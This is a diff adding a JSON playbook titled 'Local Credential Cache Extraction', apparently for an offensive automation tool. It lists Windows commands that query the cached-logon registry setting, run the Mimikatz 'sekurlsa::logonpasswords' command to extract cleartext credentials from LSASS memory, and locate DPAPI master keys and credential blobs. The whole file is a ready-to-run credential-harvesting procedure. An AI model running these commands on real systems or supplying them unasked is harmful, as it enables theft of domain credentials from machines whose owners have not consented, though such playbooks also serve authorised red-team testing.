@@ -1,0 +1,25 @@
+{
+	"name": "Local Credential Cache Extraction",
+	"description": "Harvest domain credentials stored in local caches and protected storage.",
+	"tools": [],
+	"steps": [
+		{
+			"index": 1,
+			"name": "Cache Policy Check",
+			"command": "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v CachedLogonsCount",
+			"description": "Determine cached logon limit."
+		},
+		{
+			"index": 2,
+			"name": "Memory Dump (Admin)",
+			"command": "sekurlsa::logonpasswords",
+			"description": "Extract cleartext from LSASS."
+		},
+		{
+			"index": 3,
+			"name": "DPAPI Artifacts",
+			"command": "dir %APPDATA%\\Microsoft\\Protect\\*; dir %APPDATA%\\Microsoft\\Credentials\\*",
+			"description": "Locate master keys and credential blobs."
+		}
+	]
+}
